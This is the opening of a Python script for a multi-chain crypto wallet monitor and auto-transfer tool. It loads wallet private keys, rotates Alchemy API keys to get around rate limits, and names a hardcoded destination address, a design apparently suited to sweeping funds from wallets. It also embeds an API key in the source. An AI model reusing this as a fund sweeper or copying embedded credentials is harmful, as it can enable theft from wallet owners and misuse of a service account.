#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
钱包监控转账系统 v3.0 - 纯RPC网络版
支持多个EVM/L2链条的钱包监控和自动转账
纯RPC网络架构，覆盖多条主流链条
优化API速度和菜单交互体验，支持Base、Linea、Scroll、zkSync、BSC、AVAX等
"""

import os
import sys
import json
import asyncio
import time
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import concurrent.futures

# 自动安装依赖
def auto_install_dependencies():
    """自动检测并安装缺少的依赖"""
    required_packages = {
        'web3': 'web3',
        'eth_account': 'eth-account',
        'colorama': 'colorama',
        'aiohttp': 'aiohttp',
        'cryptography': 'cryptography',
        'requests': 'requests'
    }
    
    missing_packages = []
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_name)
    
    if missing_packages:
        print(f"❌ 缺少必要的依赖包: {', '.join(missing_packages)}")
        print("💡 正在自动安装...")
        
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} 安装成功")
            except:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', package])
                    print(f"✅ {package} 安装成功 (用户模式)")
                except:
                    print(f"❌ {package} 安装失败")
                    return False
    return True

# 确保依赖可用
if not auto_install_dependencies():
    print("❌ 依赖安装失败，请手动安装")
    sys.exit(1)

# 导入依赖
try:
    from web3 import Web3
    from eth_account import Account
    from colorama import Fore, Style, init
    import aiohttp
    import cryptography
    import requests
    
    # 初始化colorama
    init(autoreset=True)
    
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
    sys.exit(1)

# 配置 - 无限API密钥轮询系统
ALCHEMY_API_KEYS = [
    "MYr2ZG1P7bxc4F1qVTLIj",   # 当前有效API密钥
    # 🔑 在此处添加更多API密钥:
    # "YOUR_NEW_API_KEY_1",
    # "YOUR_NEW_API_KEY_2", 
    # "YOUR_NEW_API_KEY_3",
    # ... 支持无限个API密钥
]
CURRENT_API_KEY_INDEX = 0
API_REQUEST_COUNT = 0  # 请求计数器，用于轮询
REQUESTS_PER_API = 5   # 每个API密钥使用几次后切换

TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"

def get_current_api_key():
    """获取当前API密钥"""
    if not ALCHEMY_API_KEYS:
        raise ValueError("❌ 没有可用的API密钥，请添加至少一个API密钥")
    return ALCHEMY_API_KEYS[CURRENT_API_KEY_INDEX]

def rotate_api_key():
    """轮询到下一个API密钥（每N次请求自动轮换）"""
    global CURRENT_API_KEY_INDEX, API_REQUEST_COUNT
    
    if len(ALCHEMY_API_KEYS) <= 1:
        return get_current_api_key()
    
    API_REQUEST_COUNT += 1
    
    # 每REQUESTS_PER_API次请求后切换API密钥
    if API_REQUEST_COUNT >= REQUESTS_PER_API:
        old_index = CURRENT_API_KEY_INDEX
        CURRENT_API_KEY_INDEX = (CURRENT_API_KEY_INDEX + 1) % len(ALCHEMY_API_KEYS)
        API_REQUEST_COUNT = 0
        
        print(f"{Fore.CYAN}🔄 轮询切换 API#{old_index + 1} → API#{CURRENT_API_KEY_INDEX + 1} ({get_current_api_key()[:8]}...){Style.RESET_ALL}")
    
    return get_current_api_key()

def force_switch_api_key():
    """强制切换到下一个API密钥（故障转移时使用）"""
    global CURRENT_API_KEY_INDEX, API_REQUEST_COUNT
    
    if len(ALCHEMY_API_KEYS) <= 1:
        return get_current_api_key()
    
    old_index = CURRENT_API_KEY_INDEX
    CURRENT_API_KEY_INDEX = (CURRENT_API_KEY_INDEX + 1) % len(ALCHEMY_API_KEYS)
    API_REQUEST_COUNT = 0
    
    print(f"{Fore.YELLOW}🚨 故障转移 API#{old_index + 1} → API#{CURRENT_API_KEY_INDEX + 1} ({get_current_api_key()[:8]}...){Style.RESET_ALL}")
    return get_current_api_key()

def add_api_key(new_api_key: str):
    """动态添加新的API密钥"""
    if new_api_key and new_api_key not in ALCHEMY_API_KEYS:
        ALCHEMY_API_KEYS.append(new_api_key)
        print(f"{Fore.GREEN}✅ 新增API密钥: {new_api_key[:8]}... (总计: {len(ALCHEMY_API_KEYS)} 个){Style.RESET_ALL}")
        return True
    return False

# 智能速率控制系统
API_RATE_LIMITS = {
    'cu_per_second': 500,           # 每秒计算单位限制
    'monthly_cu_limit': 30000000,   # 每月3000万CU限制
    'cu_per_request': 20,           # 估算每个请求消耗的CU
}

# 动态计算的速率控制参数
MONTHLY_USAGE_TRACKER = {
    'current_month': datetime.now().month,
    'current_year': datetime.now().year,
    'used_cu': 0,
    'daily_target': 0,
    'optimal_interval': 5.0,
    'last_reset': datetime.now().isoformat()
}

def calculate_optimal_scanning_params():
    """根据API限制和剩余时间计算最优扫描参数"""
    import calendar
    
    now = datetime.now()
    current_month = now.month
    current_year = now.year
    current_day = now.day
    
    # 获取当月总天数
    days_in_month = calendar.monthrange(current_year, current_month)[1]
    remaining_days = days_in_month - current_day + 1
    
    # 重置月度使用情况（如果是新月份）
    if (MONTHLY_USAGE_TRACKER['current_month'] != current_month or 
        MONTHLY_USAGE_TRACKER['current_year'] != current_year):
        MONTHLY_USAGE_TRACKER.update({
            'current_month': current_month,
            'current_year': current_year,
            'used_cu': 0,
            'last_reset': now.isoformat()
        })
    
    # 计算参数
    total_api_keys = len(ALCHEMY_API_KEYS)
    total_monthly_limit = API_RATE_LIMITS['monthly_cu_limit'] * total_api_keys  # 多API密钥扩容
    remaining_cu = total_monthly_limit - MONTHLY_USAGE_TRACKER['used_cu']
    
    # 每日目标CU使用量
    daily_target_cu = remaining_cu / remaining_days if remaining_days > 0 else remaining_cu
    
    # 每秒可用CU (考虑多API密钥)
    cu_per_second = API_RATE_LIMITS['cu_per_second'] * total_api_keys
    
    # 计算最优扫描间隔
    cu_per_request = API_RATE_LIMITS['cu_per_request']
    max_requests_per_second = cu_per_second / cu_per_request
    optimal_interval = 1.0 / max_requests_per_second if max_requests_per_second > 0 else 5.0
    
    # 确保不超过每日目标
    max_requests_per_day = daily_target_cu / cu_per_request
    max_requests_per_second_daily = max_requests_per_day / (24 * 3600)
    
    if max_requests_per_second_daily < max_requests_per_second:
        optimal_interval = 1.0 / max_requests_per_second_daily if max_requests_per_second_daily > 0 else 30.0
    
    # 更新全局参数
    MONTHLY_USAGE_TRACKER.update({
        'daily_target': daily_target_cu,
        'optimal_interval': max(optimal_interval, 0.1)  # 最小间隔0.1秒
    })
    
    return {
        'total_api_keys': total_api_keys,
        'remaining_days': remaining_days,
        'remaining_cu': remaining_cu,
        'daily_target_cu': daily_target_cu,
        'optimal_interval': MONTHLY_USAGE_TRACKER['optimal_interval'],
        'max_requests_per_second': max_requests_per_second,
        'total_monthly_limit': total_monthly_limit,
        'current_usage_percent': (MONTHLY_USAGE_TRACKER['used_cu'] / total_monthly_limit * 100) if total_monthly_limit > 0 else 0
    }

def update_cu_usage(cu_used: int):
    """更新CU使用量"""
    MONTHLY_USAGE_TRACKER['used_cu'] += cu_used

def enhanced_safe_input(prompt: str, default: str = "") -> str:
    """安全的输入函数，处理EOF和其他异常"""
    import sys
    
    try:
        # 确保输出缓冲区刷新
        sys.stdout.flush()
        
        # 检查stdin是否可用
        if not sys.stdin.isatty():
            print(f"\n{Fore.YELLOW}⚠️ 非交互模式，使用默认值: {default}{Style.RESET_ALL}")
            return default
        
        # 尝试获取输入
        user_input = input(prompt)
        result = user_input.strip()
        
        # 如果用户输入为空，返回默认值
        return result if result else default
        
    except EOFError:
        print(f"\n{Fore.YELLOW}⚠️ 输入流结束，使用默认值: {default}{Style.RESET_ALL}")
        return default
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ 用户中断，使用默认值: {default}{Style.RESET_ALL}")
        return default
    except Exception as e:
        print(f"\n{Fore.RED}❌ 输入错误: {e}，使用默认值: {default}{Style.RESET_ALL}")
        return default

def get_api_keys_status():
    """获取API密钥状态信息"""
    rate_info = calculate_optimal_scanning_params()
    return {
        'total_keys': len(ALCHEMY_API_KEYS),
        'current_index': CURRENT_API_KEY_INDEX,
        'current_key': get_current_api_key()[:12] + "..." if ALCHEMY_API_KEYS else "无",
        'request_count': API_REQUEST_COUNT,
        'requests_per_api': REQUESTS_PER_API,
        'rate_info': rate_info
    }

# 数据文件
WALLETS_FILE = "wallets.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "config.json"
NETWORK_STATUS_FILE = "network_status.json"

def build_network_config(use_rotation=False):
    """动态构建网络配置，支持API密钥轮询"""
    api_key = rotate_api_key() if use_rotation else get_current_api_key()
    return {
        # ============= Layer 1 主网 =============
        'ethereum': {
            'name': 'Ethereum 主网',
            'chain_id': 1,
            'currency': 'ETH',
            'rpc_url': f'https://eth-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 1
        },
        'polygon': {
            'name': 'Polygon PoS',
            'chain_id': 137,
            'currency': 'MATIC',
            'rpc_url': f'https://polygon-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 2
        },
        'astar': {
            'name': 'Astar',
            'chain_id': 592,
            'currency': 'ASTR',
            'rpc_url': f'https://astar-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 3
        },
        'celo': {
            'name': 'Celo',
            'chain_id': 42220,
            'currency': 'CELO',
            'rpc_url': f'https://celo-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 4
        },
        'bsc': {
            'name': 'Binance Smart Chain',
            'chain_id': 56,
            'currency': 'BNB',
            'rpc_url': f'https://bnb-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 5
        },
        'metis': {
            'name': 'Metis',
            'chain_id': 1088,
            'currency': 'METIS',
            'rpc_url': f'https://metis-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 6
        },
        'avalanche': {
            'name': 'Avalanche C-Chain',
            'chain_id': 43114,
            'currency': 'AVAX',
            'rpc_url': f'https://avax-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 7
        },
        'gnosis': {
            'name': 'Gnosis',
            'chain_id': 100,
            'currency': 'xDAI',
            'rpc_url': f'https://gnosis-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 8
        },
        'rootstock': {
            'name': 'Rootstock',
            'chain_id': 30,
            'currency': 'RBTC',
            'rpc_url': f'https://rootstock-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 9
        },
        
        # ============= Layer 2 主网 =============
        'optimism': {
            'name': 'Optimism (OP Mainnet)',
            'chain_id': 10,
            'currency': 'ETH',
            'rpc_url': f'https://opt-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 10
        },
        'arbitrum': {
            'name': 'Arbitrum',
            'chain_id': 42161,
            'currency': 'ETH',
            'rpc_url': f'https://arb-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 11
        },
        'arbitrum_nova': {
            'name': 'Arbitrum Nova',
            'chain_id': 42170,
            'currency': 'ETH',
            'rpc_url': f'https://arbnova-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 12
        },
        'polygon_zkevm': {
            'name': 'Polygon zkEVM',
            'chain_id': 1101,
            'currency': 'ETH',
            'rpc_url': f'https://polygonzkevm-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 13
        },
        'base': {
            'name': 'Base',
            'chain_id': 8453,
            'currency': 'ETH',
            'rpc_url': f'https://base-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 14
        },
        'zksync': {
            'name': 'zkSync',
            'chain_id': 324,
            'currency': 'ETH',
            'rpc_url': f'https://zksync-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 15
        },
        'linea': {
            'name': 'Linea',
            'chain_id': 59144,
            'currency': 'ETH',
            'rpc_url': f'https://linea-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 16
        },
        'scroll': {
            'name': 'Scroll',
            'chain_id': 534352,
            'currency': 'ETH',
            'rpc_url': f'https://scroll-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 17
        },
        'mantle': {
            'name': 'Mantle',
            'chain_id': 5000,
            'currency': 'MNT',
            'rpc_url': f'https://mantle-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 18
        },
        'opbnb': {
            'name': 'opBNB',
            'chain_id': 204,
            'currency': 'BNB',
            'rpc_url': f'https://opbnb-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 19
        },
        
        # 新兴L2链条 (使用已知链ID，未知的暂时使用占位符)
        'unichain': {
            'name': 'Unichain',
            'chain_id': 1301,  # 使用临时链ID，待官方确认
            'currency': 'ETH',
            'rpc_url': f'https://unichain-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 20
        },
        'berachain': {
            'name': 'Berachain',
            'chain_id': 80085,  # 使用临时链ID，待官方确认
            'currency': 'BERA',
            'rpc_url': f'https://berachain-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 21
        },
        'soneium': {
            'name': 'Soneium',
            'chain_id': 1946,  # 使用临时链ID，待官方确认
            'currency': 'ETH',
            'rpc_url': f'https://soneium-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 22
        },
        'apechain': {
            'name': 'ApeChain',
            'chain_id': 33139,  # 使用临时链ID，待官方确认
            'currency': 'APE',
            'rpc_url': f'https://apechain-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 23
        },
        'hyperevm': {
            'name': 'HyperEVM',
            'chain_id': 998,  # 使用临时链ID，待官方确认
            'currency': 'ETH',
            'rpc_url': f'https://hyperevm-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 24
        },
        
        # ============= 新增EVM兼容链条 =============
        'blast': {
            'name': 'Blast',
            'chain_id': 81457,
            'currency': 'ETH',
            'rpc_url': f'https://blast-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 25
        },
        'sonic': {
            'name': 'Sonic',
            'chain_id': 146,
            'currency': 'S',
            'rpc_url': f'https://sonic-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 26
        },
        'abstract': {
            'name': 'Abstract',
            'chain_id': 11124,
            'currency': 'ETH',
            'rpc_url': f'https://abstract-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 27
        },
        'lumia': {
            'name': 'Lumia',
            'chain_id': 994873017,
            'currency': 'LUMIA',
            'rpc_url': f'https://lumia-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 28
        },
        'ink': {
            'name': 'Ink',
            'chain_id': 57073,
            'currency': 'ETH',
            'rpc_url': f'https://ink-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 29
        },
        'story': {
            'name': 'Story',
            'chain_id': 1513,
            'currency': 'IP',
            'rpc_url': f'https://story-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 30
        },
        'anime': {
            'name': 'Anime',
            'chain_id': 11501,
            'currency': 'ANIME',
            'rpc_url': f'https://anime-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 31
        },
        'botanix': {
            'name': 'Botanix',
            'chain_id': 3636,
            'currency': 'BTC',
            'rpc_url': f'https://botanix-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 32
        },
        'crossfi': {
            'name': 'CrossFi',
            'chain_id': 4157,
            'currency': 'XFI',
            'rpc_url': f'https://crossfi-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 33
        },
        'shape': {
            'name': 'Shape',
            'chain_id': 360,
            'currency': 'ETH',
            'rpc_url': f'https://shape-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 34
        },
        'geist': {
            'name': 'Geist',
            'chain_id': 63157,
            'currency': 'GEIST',
            'rpc_url': f'https://geist-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 35
        },
        'superseed': {
            'name': 'Superseed',
            'chain_id': 5330,
            'currency': 'SEED',
            'rpc_url': f'https://superseed-mainnet.g.alchemy.com/v2/{api_key}',
            'type': 'mainnet',
            'priority': 36
        },
        
        # ============= EVM兼容测试网 =============
        'ethereum_sepolia': {
            'name': 'Ethereum Sepolia',
            'chain_id': 11155111,
            'currency': 'ETH',
            'rpc_url': f'https://eth-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 25
        },
        'ethereum_goerli': {
            'name': 'Ethereum Goerli',
            'chain_id': 5,
            'currency': 'ETH',
            'rpc_url': f'https://eth-goerli.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 26
        },
        'polygon_mumbai': {
            'name': 'Polygon Mumbai',
            'chain_id': 80001,
            'currency': 'MATIC',
            'rpc_url': f'https://polygon-mumbai.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 27
        },
        'polygon_amoy': {
            'name': 'Polygon Amoy',
            'chain_id': 80002,
            'currency': 'MATIC',
            'rpc_url': f'https://polygon-amoy.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 28
        },
        'optimism_sepolia': {
            'name': 'Optimism Sepolia',
            'chain_id': 11155420,
            'currency': 'ETH',
            'rpc_url': f'https://opt-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 29
        },
        'arbitrum_sepolia': {
            'name': 'Arbitrum Sepolia',
            'chain_id': 421614,
            'currency': 'ETH',
            'rpc_url': f'https://arb-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 30
        },
        'polygon_zkevm_cardona': {
            'name': 'Polygon zkEVM Cardona',
            'chain_id': 2442,
            'currency': 'ETH',
            'rpc_url': f'https://polygonzkevm-cardona.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 31
        },
        'base_sepolia': {
            'name': 'Base Sepolia',
            'chain_id': 84532,
            'currency': 'ETH',
            'rpc_url': f'https://base-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 32
        },
        'zksync_sepolia': {
            'name': 'zkSync Sepolia',
            'chain_id': 300,
            'currency': 'ETH',
            'rpc_url': f'https://zksync-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 33
        },
        'linea_sepolia': {
            'name': 'Linea Sepolia',
            'chain_id': 59141,
            'currency': 'ETH',
            'rpc_url': f'https://linea-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 34
        },
        'scroll_sepolia': {
            'name': 'Scroll Sepolia',
            'chain_id': 534351,
            'currency': 'ETH',
            'rpc_url': f'https://scroll-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 35
        },
        'mantle_testnet': {
            'name': 'Mantle Testnet',
            'chain_id': 5001,
            'currency': 'MNT',
            'rpc_url': f'https://mantle-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 36
        },
        'celo_alfajores': {
            'name': 'Celo Alfajores',
            'chain_id': 44787,
            'currency': 'CELO',
            'rpc_url': f'https://celo-alfajores.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 37
        },
        'gnosis_chiado': {
            'name': 'Gnosis Chiado',
            'chain_id': 10200,
            'currency': 'xDAI',
            'rpc_url': f'https://gnosis-chiado.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 38
        },
        'opbnb_testnet': {
            'name': 'opBNB Testnet',
            'chain_id': 5611,
            'currency': 'BNB',
            'rpc_url': f'https://opbnb-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 39
        },
        
        # ============= 新增EVM兼容测试网 =============
        'blast_sepolia': {
            'name': 'Blast Sepolia',
            'chain_id': 168587773,
            'currency': 'ETH',
            'rpc_url': f'https://blast-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 40
        },
        'sonic_blaze': {
            'name': 'Sonic Blaze',
            'chain_id': 57054,
            'currency': 'S',
            'rpc_url': f'https://sonic-blaze.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 41
        },
        'abstract_testnet': {
            'name': 'Abstract Testnet',
            'chain_id': 11155111,  # 使用Sepolia链ID作为测试网
            'currency': 'ETH',
            'rpc_url': f'https://abstract-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 42
        },
        'lumia_testnet': {
            'name': 'Lumia Testnet',
            'chain_id': 8866,
            'currency': 'LUMIA',
            'rpc_url': f'https://lumia-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 43
        },
        'ink_sepolia': {
            'name': 'Ink Sepolia',
            'chain_id': 763373,
            'currency': 'ETH',
            'rpc_url': f'https://ink-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 44
        },
        'story_aeneid': {
            'name': 'Story Aeneid',
            'chain_id': 1514,
            'currency': 'IP',
            'rpc_url': f'https://story-aeneid.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 45
        },
        'anime_testnet': {
            'name': 'Anime Testnet',
            'chain_id': 11502,
            'currency': 'ANIME',
            'rpc_url': f'https://anime-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 46
        },
        'botanix_testnet': {
            'name': 'Botanix Testnet',
            'chain_id': 3637,
            'currency': 'BTC',
            'rpc_url': f'https://botanix-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 47
        },
        'crossfi_testnet': {
            'name': 'CrossFi Testnet',
            'chain_id': 4158,
            'currency': 'XFI',
            'rpc_url': f'https://crossfi-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 48
        },
        'shape_sepolia': {
            'name': 'Shape Sepolia',
            'chain_id': 11011,
            'currency': 'ETH',
            'rpc_url': f'https://shape-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 49
        },
        'geist_testnet': {
            'name': 'Geist Testnet',
            'chain_id': 63158,
            'currency': 'GEIST',
            'rpc_url': f'https://geist-testnet.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 50
        },
        'superseed_sepolia': {
            'name': 'Superseed Sepolia',
            'chain_id': 5331,
            'currency': 'SEED',
            'rpc_url': f'https://superseed-sepolia.g.alchemy.com/v2/{api_key}',
            'type': 'testnet',
            'priority': 51
        }
    }

def build_supported_networks():
    """构建纯RPC网络系统"""
    supported_networks: Dict[str, Any] = {}
    network_names: Dict[str, str] = {}
    mainnets: List[str] = []
    testnets: List[str] = []
    network_priority: Dict[str, int] = {}
    
    # 获取当前网络配置
    network_config = build_network_config()
    
    # 处理所有配置的网络（纯RPC模式）
    for network_key, config in network_config.items():
        # 所有网络都使用RPC模式
        supported_networks[network_key] = {
            'mode': 'rpc',
            'config': config
        }
        
        network_names[network_key] = config['name']
        network_priority[network_key] = config['priority']
        
        if config['type'] == 'mainnet':
            mainnets.append(network_key)
        else:
            testnets.append(network_key)
    
    return supported_networks, network_names, mainnets, testnets, network_priority

def refresh_network_config():
    """刷新网络配置（API密钥切换后调用）"""
    global SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY
    SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY = build_supported_networks()

# 构建支持的网络配置
SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY = build_supported_networks()

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: List[str]
    last_checked: Dict[str, str]

@dataclass 
class NetworkStatus:
    """网络状态"""
    available: bool
    last_check: str
    error_count: int
    last_error: str

class WalletMonitor:
    """钱包监控器 - 纯RPC网络支持版"""
    
    def __init__(self):
        self.wallets: List[WalletInfo] = []
        self.web3_clients: Dict[str, Web3] = {}        # RPC模式客户端
        self.monitoring_active = False
        self.network_status: Dict[str, NetworkStatus] = {}
        self.load_wallets()
        self.load_network_status()
        
    def initialize_clients(self):
        """智能初始化网络客户端 - 轮询API密钥模式"""
        print(f"\n{Fore.CYAN}🔧 智能初始化网络客户端...{Style.RESET_ALL}")
        status = get_api_keys_status()
        print(f"{Fore.CYAN}🔑 API密钥轮询系统: {status['total_keys']} 个密钥，每{status['requests_per_api']}次请求轮换{Style.RESET_ALL}")
        
        def init_single_client(network_item):
            network_key, network_info = network_item
            
            # 对每个网络使用轮询的API密钥
            try:
                # 使用轮询获取网络配置
                network_config = build_network_config(use_rotation=True)
                config = network_config.get(network_key)
                if not config:
                    return network_key, None, False, "网络配置不存在", CURRENT_API_KEY_INDEX
                
                # 智能延迟 - 基于API限制动态调整
                rate_info = calculate_optimal_scanning_params()
                smart_delay = max(0.1, rate_info['optimal_interval'])
                time.sleep(smart_delay)
                
                # 创建Web3连接
                web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 15}))
                
                # 测试连接
                block_number = web3.eth.get_block_number()
                return network_key, web3, True, None, CURRENT_API_KEY_INDEX
                    
            except Exception as e:
                error_msg = str(e)
                
                # 检查是否是API密钥相关错误
                if "403" in error_msg or "401" in error_msg or "Invalid API key" in error_msg or "429" in error_msg:
                    # 强制切换API密钥
                    if len(ALCHEMY_API_KEYS) > 1:
                        old_key_index = CURRENT_API_KEY_INDEX
                        force_switch_api_key()
                        print(f"{Fore.YELLOW}🚨 API#{old_key_index + 1}遇到限制，强制切换到API#{CURRENT_API_KEY_INDEX + 1} - {NETWORK_NAMES.get(network_key, network_key)}{Style.RESET_ALL}")
                        return network_key, None, False, f"API限制，已切换密钥", CURRENT_API_KEY_INDEX
                    else:
                        return network_key, None, False, f"API密钥失效: {error_msg}", CURRENT_API_KEY_INDEX
                else:
                    # 非API密钥问题
                    return network_key, None, False, error_msg, CURRENT_API_KEY_INDEX
        
        # 只初始化最重要的5个网络，避免API限制
        priority_networks = sorted(SUPPORTED_NETWORKS.items(), 
                                 key=lambda x: NETWORK_PRIORITY.get(x[0], 999))[:5]
        
        success_count = 0
        mainnet_count = 0
        testnet_count = 0
        
        print(f"{Fore.CYAN}📡 初始化 {len(priority_networks)} 个核心网络 (轮询API密钥)...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 其他{len(SUPPORTED_NETWORKS) - 5}个网络将按需加载{Style.RESET_ALL}")
        
        # 串行初始化，避免API限制
        for i, (network_key, network_info) in enumerate(priority_networks, 1):
            print(f"{Fore.CYAN}[{i}/{len(priority_networks)}] 初始化 {NETWORK_NAMES.get(network_key, network_key)}...{Style.RESET_ALL}")
            
            result = init_single_client((network_key, network_info))
            network_key, client, success, error, used_key_index = result
            
            if success:
                self.web3_clients[network_key] = client
                
                self.network_status[network_key] = NetworkStatus(
                    available=True,
                    last_check=datetime.now().isoformat(),
                    error_count=0,
                    last_error=""
                )
                
                if network_key in MAINNET_NETWORKS:
                    mainnet_count += 1
                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (主网-API#{used_key_index + 1}){Style.RESET_ALL}")
                else:
                    testnet_count += 1
                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (测试网-API#{used_key_index + 1}){Style.RESET_ALL}")
                
                success_count += 1
            else:
                self.network_status[network_key] = NetworkStatus(
                    available=False,
                    last_check=datetime.now().isoformat(),
                    error_count=1,
                    last_error=error
                )
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error[:40]}...{Style.RESET_ALL}")
        
        self.save_network_status()
        
        print(f"\n{Fore.GREEN}🎉 网络初始化完成!{Style.RESET_ALL}")
        print(f"  📊 可用网络: {success_count}/5 个核心网络")
        print(f"  🌐 主网: {mainnet_count} 个")
        print(f"  🧪 测试网: {testnet_count} 个")
        print(f"  🔑 当前API密钥: #{CURRENT_API_KEY_INDEX + 1}/{len(ALCHEMY_API_KEYS)}")
        print(f"  🔄 轮询状态: {API_REQUEST_COUNT}/{REQUESTS_PER_API} 次")
        print(f"  💡 其他{len(SUPPORTED_NETWORKS) - 5}个网络将按需加载 (共{len(SUPPORTED_NETWORKS)}个)")
    
    def load_network_on_demand(self, network_key: str) -> bool:
        """按需加载网络客户端 - 轮询API密钥"""
        if network_key in self.web3_clients:
            return True
        
        try:
            # 使用轮询获取网络配置
            network_config = build_network_config(use_rotation=True)
            config = network_config.get(network_key)
            if not config:
                return False
            
            web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 15}))
            
            # 测试连接
            web3.eth.get_block_number()
            
            # 存储客户端
            self.web3_clients[network_key] = web3
            
            # 更新状态
            self.network_status[network_key] = NetworkStatus(
                available=True,
                last_check=datetime.now().isoformat(),
                error_count=0,
                last_error=""
            )
            
            print(f"{Fore.GREEN}🔗 动态加载 {NETWORK_NAMES[network_key]} 成功 (API#{CURRENT_API_KEY_INDEX + 1}){Style.RESET_ALL}")
            return True
            
        except Exception as e:
            error_msg = str(e)
            
            # 如果遇到API问题，强制切换密钥
